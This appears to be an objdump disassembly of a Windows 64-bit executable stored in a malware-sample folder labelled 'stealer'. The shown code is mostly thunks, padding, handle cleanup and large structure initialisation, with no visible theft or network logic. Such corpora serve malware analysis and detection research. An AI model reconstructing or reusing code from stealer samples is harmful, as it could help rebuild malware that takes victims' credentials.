
malware_samples/stealer/69beab2ff91f8f71d2033f7f5488ffdd4856c95b77af5ce6b103ae4cb19c9689.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140001000 <.text>:
   140001000:	48 8d 0d c2 e8 04 00 	lea    0x4e8c2(%rip),%rcx        # 0x14004f8c9
   140001007:	e9 d4 16 00 00       	jmp    0x1400026e0
   14000100c:	cc                   	int3
   14000100d:	cc                   	int3
   14000100e:	cc                   	int3
   14000100f:	cc                   	int3
   140001010:	48 8d 0d b1 e8 04 00 	lea    0x4e8b1(%rip),%rcx        # 0x14004f8c8
   140001017:	e9 34 18 00 00       	jmp    0x140002850
   14000101c:	cc                   	int3
   14000101d:	cc                   	int3
   14000101e:	cc                   	int3
   14000101f:	cc                   	int3
   140001020:	48 8d 0d a4 e8 04 00 	lea    0x4e8a4(%rip),%rcx        # 0x14004f8cb
   140001027:	e9 b4 16 00 00       	jmp    0x1400026e0
   14000102c:	cc                   	int3
   14000102d:	cc                   	int3
   14000102e:	cc                   	int3
   14000102f:	cc                   	int3
   140001030:	48 8d 0d 93 e8 04 00 	lea    0x4e893(%rip),%rcx        # 0x14004f8ca
   140001037:	e9 14 18 00 00       	jmp    0x140002850
   14000103c:	cc                   	int3
   14000103d:	cc                   	int3
   14000103e:	cc                   	int3
   14000103f:	cc                   	int3
   140001040:	48 8d 0d 86 e8 04 00 	lea    0x4e886(%rip),%rcx        # 0x14004f8cd
   140001047:	e9 94 16 00 00       	jmp    0x1400026e0
   14000104c:	cc                   	int3
   14000104d:	cc                   	int3
   14000104e:	cc                   	int3
   14000104f:	cc                   	int3
   140001050:	48 8d 0d 75 e8 04 00 	lea    0x4e875(%rip),%rcx        # 0x14004f8cc
   140001057:	e9 f4 17 00 00       	jmp    0x140002850
   14000105c:	cc                   	int3
   14000105d:	cc                   	int3
   14000105e:	cc                   	int3
   14000105f:	cc                   	int3
   140001060:	48 83 ec 28          	sub    $0x28,%rsp
   140001064:	48 8d 15 05 62 04 00 	lea    0x46205(%rip),%rdx        # 0x140047270
   14000106b:	48 8d 0d 5e e8 04 00 	lea    0x4e85e(%rip),%rcx        # 0x14004f8d0
   140001072:	e8 c9 92 01 00       	call   0x14001a340
   140001077:	48 8d 0d 22 ef 03 00 	lea    0x3ef22(%rip),%rcx        # 0x14003ffa0
   14000107e:	48 83 c4 28          	add    $0x28,%rsp
   140001082:	e9 dd dc 03 00       	jmp    0x14003ed64
   140001087:	cc                   	int3
   140001088:	cc                   	int3
   140001089:	cc                   	int3
   14000108a:	cc                   	int3
   14000108b:	cc                   	int3
   14000108c:	cc                   	int3
   14000108d:	cc                   	int3
   14000108e:	cc                   	int3
   14000108f:	cc                   	int3
   140001090:	48 83 ec 28          	sub    $0x28,%rsp
   140001094:	48 8d 15 d5 62 04 00 	lea    0x462d5(%rip),%rdx        # 0x140047370
   14000109b:	48 8d 0d 4e e8 04 00 	lea    0x4e84e(%rip),%rcx        # 0x14004f8f0
   1400010a2:	e8 99 92 01 00       	call   0x14001a340
   1400010a7:	48 8d 0d 72 ef 03 00 	lea    0x3ef72(%rip),%rcx        # 0x140040020
   1400010ae:	48 83 c4 28          	add    $0x28,%rsp
   1400010b2:	e9 ad dc 03 00       	jmp    0x14003ed64
   1400010b7:	cc                   	int3
   1400010b8:	cc                   	int3
   1400010b9:	cc                   	int3
   1400010ba:	cc                   	int3
   1400010bb:	cc                   	int3
   1400010bc:	cc                   	int3
   1400010bd:	cc                   	int3
   1400010be:	cc                   	int3
   1400010bf:	cc                   	int3
   1400010c0:	48 8d 0d 08 e8 04 00 	lea    0x4e808(%rip),%rcx        # 0x14004f8cf
   1400010c7:	e9 14 16 00 00       	jmp    0x1400026e0
   1400010cc:	cc                   	int3
   1400010cd:	cc                   	int3
   1400010ce:	cc                   	int3
   1400010cf:	cc                   	int3
   1400010d0:	48 8d 0d f7 e7 04 00 	lea    0x4e7f7(%rip),%rcx        # 0x14004f8ce
   1400010d7:	e9 74 17 00 00       	jmp    0x140002850
   1400010dc:	cc                   	int3
   1400010dd:	cc                   	int3
   1400010de:	cc                   	int3
   1400010df:	cc                   	int3
   1400010e0:	48 83 ec 28          	sub    $0x28,%rsp
   1400010e4:	33 c9                	xor    %ecx,%ecx
   1400010e6:	ff 15 f4 01 04 00    	call   *0x401f4(%rip)        # 0x1400412e0
   1400010ec:	89 05 36 e9 04 00    	mov    %eax,0x4e936(%rip)        # 0x14004fa28
   1400010f2:	48 83 c4 28          	add    $0x28,%rsp
   1400010f6:	c3                   	ret
   1400010f7:	cc                   	int3
   1400010f8:	cc                   	int3
   1400010f9:	cc                   	int3
   1400010fa:	cc                   	int3
   1400010fb:	cc                   	int3
   1400010fc:	cc                   	int3
   1400010fd:	cc                   	int3
   1400010fe:	cc                   	int3
   1400010ff:	cc                   	int3
   140001100:	48 83 ec 28          	sub    $0x28,%rsp
   140001104:	b9 01 00 00 00       	mov    $0x1,%ecx
   140001109:	ff 15 d1 01 04 00    	call   *0x401d1(%rip)        # 0x1400412e0
   14000110f:	89 05 23 e9 04 00    	mov    %eax,0x4e923(%rip)        # 0x14004fa38
   140001115:	48 83 c4 28          	add    $0x28,%rsp
   140001119:	c3                   	ret
   14000111a:	cc                   	int3
   14000111b:	cc                   	int3
   14000111c:	cc                   	int3
   14000111d:	cc                   	int3
   14000111e:	cc                   	int3
   14000111f:	cc                   	int3
   140001120:	8b 05 02 e9 04 00    	mov    0x4e902(%rip),%eax        # 0x14004fa28
   140001126:	99                   	cltd
   140001127:	2b c2                	sub    %edx,%eax
   140001129:	d1 f8                	sar    $1,%eax
   14000112b:	89 05 df e8 04 00    	mov    %eax,0x4e8df(%rip)        # 0x14004fa10
   140001131:	c3                   	ret
   140001132:	cc                   	int3
   140001133:	cc                   	int3
   140001134:	cc                   	int3
   140001135:	cc                   	int3
   140001136:	cc                   	int3
   140001137:	cc                   	int3
   140001138:	cc                   	int3
   140001139:	cc                   	int3
   14000113a:	cc                   	int3
   14000113b:	cc                   	int3
   14000113c:	cc                   	int3
   14000113d:	cc                   	int3
   14000113e:	cc                   	int3
   14000113f:	cc                   	int3
   140001140:	8b 05 f2 e8 04 00    	mov    0x4e8f2(%rip),%eax        # 0x14004fa38
   140001146:	99                   	cltd
   140001147:	2b c2                	sub    %edx,%eax
   140001149:	d1 f8                	sar    $1,%eax
   14000114b:	89 05 db e8 04 00    	mov    %eax,0x4e8db(%rip)        # 0x14004fa2c
   140001151:	c3                   	ret
   140001152:	cc                   	int3
   140001153:	cc                   	int3
   140001154:	cc                   	int3
   140001155:	cc                   	int3
   140001156:	cc                   	int3
   140001157:	cc                   	int3
   140001158:	cc                   	int3
   140001159:	cc                   	int3
   14000115a:	cc                   	int3
   14000115b:	cc                   	int3
   14000115c:	cc                   	int3
   14000115d:	cc                   	int3
   14000115e:	cc                   	int3
   14000115f:	cc                   	int3
   140001160:	48 8d 0d 39 ef 03 00 	lea    0x3ef39(%rip),%rcx        # 0x1400400a0
   140001167:	e9 f8 db 03 00       	jmp    0x14003ed64
   14000116c:	cc                   	int3
   14000116d:	cc                   	int3
   14000116e:	cc                   	int3
   14000116f:	cc                   	int3
   140001170:	48 8d 0d 39 ef 03 00 	lea    0x3ef39(%rip),%rcx        # 0x1400400b0
   140001177:	e9 e8 db 03 00       	jmp    0x14003ed64
   14000117c:	cc                   	int3
   14000117d:	cc                   	int3
   14000117e:	cc                   	int3
   14000117f:	cc                   	int3
   140001180:	c2 00 00             	ret    $0x0
   140001183:	cc                   	int3
   140001184:	cc                   	int3
   140001185:	cc                   	int3
   140001186:	cc                   	int3
   140001187:	cc                   	int3
   140001188:	cc                   	int3
   140001189:	cc                   	int3
   14000118a:	cc                   	int3
   14000118b:	cc                   	int3
   14000118c:	cc                   	int3
   14000118d:	cc                   	int3
   14000118e:	cc                   	int3
   14000118f:	cc                   	int3
   140001190:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001195:	57                   	push   %rdi
   140001196:	48 83 ec 20          	sub    $0x20,%rsp
   14000119a:	48 8b f9             	mov    %rcx,%rdi
   14000119d:	e8 0e 26 02 00       	call   0x1400237b0
   1400011a2:	90                   	nop
   1400011a3:	48 8d 8f a8 00 00 00 	lea    0xa8(%rdi),%rcx
   1400011aa:	e8 c1 56 02 00       	call   0x140026870
   1400011af:	90                   	nop
   1400011b0:	48 8b 8f b8 00 00 00 	mov    0xb8(%rdi),%rcx
   1400011b7:	48 85 c9             	test   %rcx,%rcx
   1400011ba:	74 19                	je     0x1400011d5
   1400011bc:	48 8b 05 3d e6 04 00 	mov    0x4e63d(%rip),%rax        # 0x14004f800
   1400011c3:	48 85 c0             	test   %rax,%rax
   1400011c6:	74 06                	je     0x1400011ce
   1400011c8:	ff 88 ec 00 00 00    	decl   0xec(%rax)
   1400011ce:	ff 15 2c 02 04 00    	call   *0x4022c(%rip)        # 0x140041400
   1400011d4:	90                   	nop
   1400011d5:	48 8b 8f 80 00 00 00 	mov    0x80(%rdi),%rcx
   1400011dc:	48 85 c9             	test   %rcx,%rcx
   1400011df:	74 19                	je     0x1400011fa
   1400011e1:	48 8b 05 18 e6 04 00 	mov    0x4e618(%rip),%rax        # 0x14004f800
   1400011e8:	48 85 c0             	test   %rax,%rax
   1400011eb:	74 06                	je     0x1400011f3
   1400011ed:	ff 88 ec 00 00 00    	decl   0xec(%rax)
   1400011f3:	ff 15 07 02 04 00    	call   *0x40207(%rip)        # 0x140041400
   1400011f9:	90                   	nop
   1400011fa:	48 8b 4f 70          	mov    0x70(%rdi),%rcx
   1400011fe:	48 85 c9             	test   %rcx,%rcx
   140001201:	74 19                	je     0x14000121c
   140001203:	48 8b 05 f6 e5 04 00 	mov    0x4e5f6(%rip),%rax        # 0x14004f800
   14000120a:	48 85 c0             	test   %rax,%rax
   14000120d:	74 06                	je     0x140001215
   14000120f:	ff 88 ec 00 00 00    	decl   0xec(%rax)
   140001215:	ff 15 e5 01 04 00    	call   *0x401e5(%rip)        # 0x140041400
   14000121b:	90                   	nop
   14000121c:	48 8b 4f 60          	mov    0x60(%rdi),%rcx
   140001220:	48 85 c9             	test   %rcx,%rcx
   140001223:	74 19                	je     0x14000123e
   140001225:	48 8b 05 d4 e5 04 00 	mov    0x4e5d4(%rip),%rax        # 0x14004f800
   14000122c:	48 85 c0             	test   %rax,%rax
   14000122f:	74 06                	je     0x140001237
   140001231:	ff 88 ec 00 00 00    	decl   0xec(%rax)
   140001237:	ff 15 c3 01 04 00    	call   *0x401c3(%rip)        # 0x140041400
   14000123d:	90                   	nop
   14000123e:	48 8b 4f 28          	mov    0x28(%rdi),%rcx
   140001242:	48 85 c9             	test   %rcx,%rcx
   140001245:	74 19                	je     0x140001260
   140001247:	48 8b 05 b2 e5 04 00 	mov    0x4e5b2(%rip),%rax        # 0x14004f800
   14000124e:	48 85 c0             	test   %rax,%rax
   140001251:	74 06                	je     0x140001259
   140001253:	ff 88 ec 00 00 00    	decl   0xec(%rax)
   140001259:	ff 15 a1 01 04 00    	call   *0x401a1(%rip)        # 0x140041400
   14000125f:	90                   	nop
   140001260:	48 8b 4f 18          	mov    0x18(%rdi),%rcx
   140001264:	48 85 c9             	test   %rcx,%rcx
   140001267:	74 19                	je     0x140001282
   140001269:	48 8b 05 90 e5 04 00 	mov    0x4e590(%rip),%rax        # 0x14004f800
   140001270:	48 85 c0             	test   %rax,%rax
   140001273:	74 06                	je     0x14000127b
   140001275:	ff 88 ec 00 00 00    	decl   0xec(%rax)
   14000127b:	ff 15 7f 01 04 00    	call   *0x4017f(%rip)        # 0x140041400
   140001281:	90                   	nop
   140001282:	48 8b 4f 08          	mov    0x8(%rdi),%rcx
   140001286:	48 85 c9             	test   %rcx,%rcx
   140001289:	74 19                	je     0x1400012a4
   14000128b:	48 8b 05 6e e5 04 00 	mov    0x4e56e(%rip),%rax        # 0x14004f800
   140001292:	48 85 c0             	test   %rax,%rax
   140001295:	74 06                	je     0x14000129d
   140001297:	ff 88 ec 00 00 00    	decl   0xec(%rax)
   14000129d:	ff 15 5d 01 04 00    	call   *0x4015d(%rip)        # 0x140041400
   1400012a3:	90                   	nop
   1400012a4:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400012a9:	48 83 c4 20          	add    $0x20,%rsp
   1400012ad:	5f                   	pop    %rdi
   1400012ae:	c3                   	ret
   1400012af:	cc                   	int3
   1400012b0:	48 8d 05 21 e5 04 00 	lea    0x4e521(%rip),%rax        # 0x14004f7d8
   1400012b7:	c3                   	ret
   1400012b8:	cc                   	int3
   1400012b9:	cc                   	int3
   1400012ba:	cc                   	int3
   1400012bb:	cc                   	int3
   1400012bc:	cc                   	int3
   1400012bd:	cc                   	int3
   1400012be:	cc                   	int3
   1400012bf:	cc                   	int3
   1400012c0:	48 8d 05 89 e6 04 00 	lea    0x4e689(%rip),%rax        # 0x14004f950
   1400012c7:	c3                   	ret
   1400012c8:	cc                   	int3
   1400012c9:	cc                   	int3
   1400012ca:	cc                   	int3
   1400012cb:	cc                   	int3
   1400012cc:	cc                   	int3
   1400012cd:	cc                   	int3
   1400012ce:	cc                   	int3
   1400012cf:	cc                   	int3
   1400012d0:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   1400012d5:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   1400012da:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   1400012df:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   1400012e4:	53                   	push   %rbx
   1400012e5:	57                   	push   %rdi
   1400012e6:	48 83 ec 38          	sub    $0x38,%rsp
   1400012ea:	b9 01 00 00 00       	mov    $0x1,%ecx
   1400012ef:	48 8d 7c 24 58       	lea    0x58(%rsp),%rdi
   1400012f4:	ff 15 ae 02 04 00    	call   *0x402ae(%rip)        # 0x1400415a8
   1400012fa:	48 8b d8             	mov    %rax,%rbx
   1400012fd:	e8 ae ff ff ff       	call   0x1400012b0
   140001302:	4c 8b 44 24 50       	mov    0x50(%rsp),%r8
   140001307:	45 33 c9             	xor    %r9d,%r9d
   14000130a:	48 8b d3             	mov    %rbx,%rdx
   14000130d:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140001312:	48 8b 08             	mov    (%rax),%rcx
   140001315:	ff 15 85 02 04 00    	call   *0x40285(%rip)        # 0x1400415a0
   14000131b:	48 83 c4 38          	add    $0x38,%rsp
   14000131f:	5f                   	pop    %rdi
   140001320:	5b                   	pop    %rbx
   140001321:	c3                   	ret
   140001322:	cc                   	int3
   140001323:	cc                   	int3
   140001324:	cc                   	int3
   140001325:	cc                   	int3
   140001326:	cc                   	int3
   140001327:	cc                   	int3
   140001328:	cc                   	int3
   140001329:	cc                   	int3
   14000132a:	cc                   	int3
   14000132b:	cc                   	int3
   14000132c:	cc                   	int3
   14000132d:	cc                   	int3
   14000132e:	cc                   	int3
   14000132f:	cc                   	int3
   140001330:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140001335:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   14000133a:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   14000133f:	53                   	push   %rbx
   140001340:	56                   	push   %rsi
   140001341:	57                   	push   %rdi
   140001342:	48 83 ec 30          	sub    $0x30,%rsp
   140001346:	48 8b fa             	mov    %rdx,%rdi
   140001349:	48 8d 74 24 60       	lea    0x60(%rsp),%rsi
   14000134e:	48 8b d9             	mov    %rcx,%rbx
   140001351:	e8 6a ff ff ff       	call   0x1400012c0
   140001356:	48 89 74 24 28       	mov    %rsi,0x28(%rsp)
   14000135b:	4c 8b cf             	mov    %rdi,%r9
   14000135e:	49 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%r8
   140001365:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   14000136c:	00 00 
   14000136e:	48 8b d3             	mov    %rbx,%rdx
   140001371:	48 8b 08             	mov    (%rax),%rcx
   140001374:	ff 15 fe 01 04 00    	call   *0x401fe(%rip)        # 0x140041578
   14000137a:	48 83 c4 30          	add    $0x30,%rsp
   14000137e:	5f                   	pop    %rdi
   14000137f:	5e                   	pop    %rsi
   140001380:	5b                   	pop    %rbx
   140001381:	c3                   	ret
   140001382:	cc                   	int3
   140001383:	cc                   	int3
   140001384:	cc                   	int3
   140001385:	cc                   	int3
   140001386:	cc                   	int3
   140001387:	cc                   	int3
   140001388:	cc                   	int3
   140001389:	cc                   	int3
   14000138a:	cc                   	int3
   14000138b:	cc                   	int3
   14000138c:	cc                   	int3
   14000138d:	cc                   	int3
   14000138e:	cc                   	int3
   14000138f:	cc                   	int3
   140001390:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001395:	57                   	push   %rdi
   140001396:	48 83 ec 20          	sub    $0x20,%rsp
   14000139a:	48 8b d9             	mov    %rcx,%rbx
   14000139d:	48 8b f9             	mov    %rcx,%rdi
   1400013a0:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   1400013a5:	b9 8c 00 00 00       	mov    $0x8c,%ecx
   1400013aa:	48 0f bf c0          	movswq %ax,%rax
   1400013ae:	66 f3 ab             	rep stos %ax,(%rdi)
   1400013b1:	48 8b 8b 20 01 00 00 	mov    0x120(%rbx),%rcx
   1400013b8:	33 ff                	xor    %edi,%edi
   1400013ba:	48 85 c9             	test   %rcx,%rcx
   1400013bd:	74 26                	je     0x1400013e5
   1400013bf:	48 8b 05 3a e4 04 00 	mov    0x4e43a(%rip),%rax        # 0x14004f800
   1400013c6:	48 89 bb 18 01 00 00 	mov    %rdi,0x118(%rbx)
   1400013cd:	48 85 c0             	test   %rax,%rax
   1400013d0:	74 06                	je     0x1400013d8
   1400013d2:	ff 88 ec 00 00 00    	decl   0xec(%rax)
   1400013d8:	ff 15 22 00 04 00    	call   *0x40022(%rip)        # 0x140041400
   1400013de:	48 89 bb 20 01 00 00 	mov    %rdi,0x120(%rbx)
   1400013e5:	48 8b 8b 30 01 00 00 	mov    0x130(%rbx),%rcx
   1400013ec:	48 85 c9             	test   %rcx,%rcx
   1400013ef:	74 26                	je     0x140001417
   1400013f1:	48 8b 05 08 e4 04 00 	mov    0x4e408(%rip),%rax        # 0x14004f800
   1400013f8:	48 89 bb 28 01 00 00 	mov    %rdi,0x128(%rbx)
   1400013ff:	48 85 c0             	test   %rax,%rax
   140001402:	74 06                	je     0x14000140a
   140001404:	ff 88 ec 00 00 00    	decl   0xec(%rax)
   14000140a:	ff 15 f0 ff 03 00    	call   *0x3fff0(%rip)        # 0x140041400
   140001410:	48 89 bb 30 01 00 00 	mov    %rdi,0x130(%rbx)
   140001417:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000141c:	48 83 c4 20          	add    $0x20,%rsp
   140001420:	5f                   	pop    %rdi
   140001421:	c3                   	ret
   140001422:	cc                   	int3
   140001423:	cc                   	int3
   140001424:	cc                   	int3
   140001425:	cc                   	int3
   140001426:	cc                   	int3
   140001427:	cc                   	int3
   140001428:	cc                   	int3
   140001429:	cc                   	int3
   14000142a:	cc                   	int3
   14000142b:	cc                   	int3
   14000142c:	cc                   	int3
   14000142d:	cc                   	int3
   14000142e:	cc                   	int3
   14000142f:	cc                   	int3
   140001430:	48 8b c4             	mov    %rsp,%rax
   140001433:	48 89 58 18          	mov    %rbx,0x18(%rax)
   140001437:	48 89 68 20          	mov    %rbp,0x20(%rax)
   14000143b:	48 89 50 10          	mov    %rdx,0x10(%rax)
   14000143f:	48 89 48 08          	mov    %rcx,0x8(%rax)
   140001443:	56                   	push   %rsi
   140001444:	57                   	push   %rdi
   140001445:	41 56                	push   %r14
   140001447:	48 83 ec 50          	sub    $0x50,%rsp
   14000144b:	0f 29 70 d8          	movaps %xmm6,-0x28(%rax)
   14000144f:	0f 29 78 c8          	movaps %xmm7,-0x38(%rax)
   140001453:	44 0f 29 40 b8       	movaps %xmm8,-0x48(%rax)
   140001458:	48 8b d9             	mov    %rcx,%rbx
   14000145b:	48 8d 79 08          	lea    0x8(%rcx),%rdi
   14000145f:	48 89 7c 24 78       	mov    %rdi,0x78(%rsp)
   140001464:	33 c0                	xor    %eax,%eax
   140001466:	66 89 47 3d          	mov    %ax,0x3d(%rdi)
   14000146a:	88 47 3f             	mov    %al,0x3f(%rdi)
   14000146d:	89 47 72             	mov    %eax,0x72(%rdi)
   140001470:	66 89 47 76          	mov    %ax,0x76(%rdi)
   140001474:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001477:	0f 11 87 a0 00 00 00 	movups %xmm0,0xa0(%rdi)
   14000147e:	0f 11 87 b0 00 00 00 	movups %xmm0,0xb0(%rdi)
   140001485:	0f 11 87 c0 00 00 00 	movups %xmm0,0xc0(%rdi)
   14000148c:	0f 11 87 d0 00 00 00 	movups %xmm0,0xd0(%rdi)
   140001493:	0f 11 87 e0 00 00 00 	movups %xmm0,0xe0(%rdi)
   14000149a:	48 8d 8f 20 0b 00 00 	lea    0xb20(%rdi),%rcx
   1400014a1:	33 d2                	xor    %edx,%edx
   1400014a3:	41 b8 d8 02 00 00    	mov    $0x2d8,%r8d
   1400014a9:	e8 06 e2 03 00       	call   0x14003f6b4
   1400014ae:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400014b1:	0f 11 87 00 0e 00 00 	movups %xmm0,0xe00(%rdi)
   1400014b8:	48 8d 8f 14 0e 00 00 	lea    0xe14(%rdi),%rcx
   1400014bf:	33 d2                	xor    %edx,%edx
   1400014c1:	41 b8 cc 28 00 00    	mov    $0x28cc,%r8d
   1400014c7:	e8 e8 e1 03 00       	call   0x14003f6b4
   1400014cc:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400014cf:	0f 11 87 e8 36 00 00 	movups %xmm0,0x36e8(%rdi)
   1400014d6:	0f 11 87 f8 36 00 00 	movups %xmm0,0x36f8(%rdi)
   1400014dd:	0f 11 87 08 37 00 00 	movups %xmm0,0x3708(%rdi)
   1400014e4:	0f 11 87 18 37 00 00 	movups %xmm0,0x3718(%rdi)
   1400014eb:	0f 11 87 28 37 00 00 	movups %xmm0,0x3728(%rdi)
   1400014f2:	0f 11 87 38 37 00 00 	movups %xmm0,0x3738(%rdi)
   1400014f9:	0f 11 87 48 37 00 00 	movups %xmm0,0x3748(%rdi)
   140001500:	0f 11 87 58 37 00 00 	movups %xmm0,0x3758(%rdi)
   140001507:	0f 11 87 90 37 00 00 	movups %xmm0,0x3790(%rdi)
   14000150e:	0f 11 87 a0 37 00 00 	movups %xmm0,0x37a0(%rdi)
   140001515:	0f 11 87 b0 37 00 00 	movups %xmm0,0x37b0(%rdi)
   14000151c:	33 ed                	xor    %ebp,%ebp
   14000151e:	48 89 2f             	mov    %rbp,(%rdi)
   140001521:	c7 47 08 00 00 80 bf 	movl   $0xbf800000,0x8(%rdi)
   140001528:	c7 47 0c 00 00 80 bf 	movl   $0xbf800000,0xc(%rdi)
   14000152f:	c7 47 10 89 88 88 3c 	movl   $0x3c888889,0x10(%rdi)
   140001536:	c7 47 14 00 00 a0 40 	movl   $0x40a00000,0x14(%rdi)
   14000153d:	48 8d 05 cc 03 04 00 	lea    0x403cc(%rip),%rax        # 0x140041910
   140001544:	48 89 47 18          	mov    %rax,0x18(%rdi)
   140001548:	48 8d 05 d1 03 04 00 	lea    0x403d1(%rip),%rax        # 0x140041920
   14000154f:	48 89 47 20          	mov    %rax,0x20(%rdi)
   140001553:	48 8d 8f f0 00 00 00 	lea    0xf0(%rdi),%rcx
   14000155a:	ba ff ff ff ff       	mov    $0xffffffff,%edx
   14000155f:	41 b8 30 0a 00 00    	mov    $0xa30,%r8d
   140001565:	e8 4a e1 03 00       	call   0x14003f6b4
   14000156a:	48 89 6f 28          	mov    %rbp,0x28(%rdi)
   14000156e:	48 89 6f 30          	mov    %rbp,0x30(%rdi)
   140001572:	c7 47 38 00 00 80 3f 	movl   $0x3f800000,0x38(%rdi)
   140001579:	48 89 6f 40          	mov    %rbp,0x40(%rdi)
   14000157d:	40 88 6f 3c          	mov    %bpl,0x3c(%rdi)
   140001581:	c7 47 48 00 00 80 3f 	movl   $0x3f800000,0x48(%rdi)
   140001588:	c7 47 4c 00 00 80 3f 	movl   $0x3f800000,0x4c(%rdi)
   14000158f:	c7 47 5c 9a 99 99 3e 	movl   $0x3e99999a,0x5c(%rdi)
   140001596:	c7 47 60 00 00 c0 40 	movl   $0x40c00000,0x60(%rdi)
   14000159d:	c7 47 64 00 00 c0 40 	movl   $0x40c00000,0x64(%rdi)
   1400015a4:	c7 47 68 cd cc 8c 3e 	movl   $0x3e8ccccd,0x68(%rdi)
   1400015ab:	c7 47 6c cd cc 4c 3d 	movl   $0x3d4ccccd,0x6c(%rdi)
   1400015b2:	c7 47 50 00 00 01 01 	movl   $0x1010000,0x50(%rdi)
   1400015b9:	c7 47 54 00 00 01 00 	movl   $0x10000,0x54(%rdi)
   1400015c0:	c7 47 58 00 00 70 42 	movl   $0x42700000,0x58(%rdi)
   1400015c7:	66 89 6f 70          	mov    %bp,0x70(%rdi)
   1400015cb:	48 89 af 80 00 00 00 	mov    %rbp,0x80(%rdi)
   1400015d2:	48 89 6f 78          	mov    %rbp,0x78(%rdi)
   1400015d6:	48 89 af 98 00 00 00 	mov    %rbp,0x98(%rdi)
   1400015dd:	48 89 af 90 00 00 00 	mov    %rbp,0x90(%rdi)
   1400015e4:	48 89 af 88 00 00 00 	mov    %rbp,0x88(%rdi)
   1400015eb:	c7 87 f8 0d 00 00 ff 	movl   $0xff7fffff,0xdf8(%rdi)
   1400015f2:	ff 7f ff 
   1400015f5:	c7 87 fc 0d 00 00 ff 	movl   $0xff7fffff,0xdfc(%rdi)
   1400015fc:	ff 7f ff 
   1400015ff:	c7 87 e0 36 00 00 ff 	movl   $0xff7fffff,0x36e0(%rdi)
   140001606:	ff 7f ff 
   140001609:	c7 87 e4 36 00 00 ff 	movl   $0xff7fffff,0x36e4(%rdi)
   140001610:	ff 7f ff 
   140001613:	89 af 10 0e 00 00    	mov    %ebp,0xe10(%rdi)
   140001619:	c7 87 7c 37 00 00 00 	movl   $0xbf800000,0x377c(%rdi)
   140001620:	00 80 bf 
   140001623:	c7 87 68 37 00 00 00 	movl   $0xbf800000,0x3768(%rdi)
   14000162a:	00 80 bf 
   14000162d:	c7 87 80 37 00 00 00 	movl   $0xbf800000,0x3780(%rdi)
   140001634:	00 80 bf 
   140001637:	c7 87 6c 37 00 00 00 	movl   $0xbf800000,0x376c(%rdi)
   14000163e:	00 80 bf 
   140001641:	c7 87 84 37 00 00 00 	movl   $0xbf800000,0x3784(%rdi)
   140001648:	00 80 bf 
   14000164b:	c7 87 70 37 00 00 00 	movl   $0xbf800000,0x3770(%rdi)
   140001652:	00 80 bf 
   140001655:	c7 87 88 37 00 00 00 	movl   $0xbf800000,0x3788(%rdi)
   14000165c:	00 80 bf 
   14000165f:	c7 87 74 37 00 00 00 	movl   $0xbf800000,0x3774(%rdi)
   140001666:	00 80 bf 
   140001669:	c7 87 8c 37 00 00 00 	movl   $0xbf800000,0x378c(%rdi)
   140001670:	00 80 bf 
   140001673:	c7 87 78 37 00 00 00 	movl   $0xbf800000,0x3778(%rdi)
   14000167a:	00 80 bf 
   14000167d:	48 8d 87 20 0e 00 00 	lea    0xe20(%rdi),%rax
   140001684:	b9 8c 02 00 00       	mov    $0x28c,%ecx
   140001689:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140001690:	c7 40 04 00 00 80 bf 	movl   $0xbf800000,0x4(%rax)
   140001697:	c7 00 00 00 80 bf    	movl   $0xbf800000,(%rax)
   14000169d:	48 8d 40 10          	lea    0x10(%rax),%rax
   1400016a1:	48 83 e9 01          	sub    $0x1,%rcx
   1400016a5:	75 e9                	jne    0x140001690
   1400016a7:	66 c7 87 a9 37 00 00 	movw   $0xff01,0x37a9(%rdi)
   1400016ae:	01 ff 
   1400016b0:	c6 87 ab 37 00 00 01 	movb   $0x1,0x37ab(%rdi)
   1400016b7:	48 8d 8b c8 37 00 00 	lea    0x37c8(%rbx),%rcx
   1400016be:	e8 cd 14 00 00       	call   0x140002b90
   1400016c3:	4c 8d b3 18 3c 00 00 	lea    0x3c18(%rbx),%r14
   1400016ca:	4c 89 74 24 78       	mov    %r14,0x78(%rsp)
   1400016cf:	49 89 2e             	mov    %rbp,(%r14)
   1400016d2:	49 89 6e 1c          	mov    %rbp,0x1c(%r14)
   1400016d6:	49 89 6e 24          	mov    %rbp,0x24(%r14)
   1400016da:	49 89 6e 30          	mov    %rbp,0x30(%r14)
   1400016de:	49 89 6e 38          	mov    %rbp,0x38(%r14)
   1400016e2:	49 8d 46 40          	lea    0x40(%r14),%rax
   1400016e6:	b9 30 00 00 00       	mov    $0x30,%ecx
   1400016eb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400016f0:	48 89 28             	mov    %rbp,(%rax)
   1400016f3:	48 8d 40 08          	lea    0x8(%rax),%rax
   1400016f7:	48 83 e9 01          	sub    $0x1,%rcx
   1400016fb:	75 f3                	jne    0x1400016f0
   1400016fd:	33 d2                	xor    %edx,%edx
   1400016ff:	41 b8 10 02 00 00    	mov    $0x210,%r8d
   140001705:	49 8b ce             	mov    %r14,%rcx
   140001708:	e8 a7 df 03 00       	call   0x14003f6b4
   14000170d:	8b fd                	mov    %ebp,%edi
   14000170f:	49 8d 76 40          	lea    0x40(%r14),%rsi
   140001713:	f3 0f 10 3d 11 6b 04 	movss  0x46b11(%rip),%xmm7        # 0x14004822c
   14000171a:	00 
   14000171b:	f3 44 0f 10 05 6c 6b 	movss  0x46b6c(%rip),%xmm8        # 0x140048290
   140001722:	04 00 
   140001724:	0f 1f 40 00          	nopl   0x0(%rax)
   140001728:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000172f:	00 
